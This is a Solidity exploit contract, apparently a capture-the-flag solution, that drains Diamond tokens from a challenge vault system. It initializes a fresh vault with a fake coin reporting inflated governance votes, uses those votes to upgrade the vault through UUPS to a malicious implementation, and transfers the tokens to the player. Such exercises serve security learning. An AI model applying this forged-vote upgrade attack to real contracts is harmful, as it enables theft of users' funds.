// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "src/Challenge.sol";
import { console } from "forge-std/console.sol";

contract Exploit2 {
    Challenge private immutable CHALLENGE;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
    }

    function exploit() external {

        VaultFactory vf = CHALLENGE.vaultFactory();
        Diamond d = CHALLENGE.diamond();

        Vault v = vf.createVault(keccak256("The tea in Nepal is very hot. But the coffee in Peru is much hotter."));
        FakeCoin fc = new FakeCoin();
        v.initialize(address(fc), address(fc));

        v.governanceCall(
            abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(new RescueVault()))
        );

        RescueVault(address(v)).rescue(d, CHALLENGE.PLAYER());
    }
}

contract FakeCoin {
    function balanceOf(address) external view returns (uint) {
        return 0;
    }
    function getCurrentVotes(address) external view returns (uint) {
        return 100_000 ether;
    }
}

contract Rescuer {
    function rescue(Diamond d, address to) external {
        d.transfer(to, d.balanceOf(address(this)));
    }
}

contract RescueVault is Vault {
    function rescue(Diamond d, address to) external {
        (new Rescuer()).rescue(d, to);
    }
}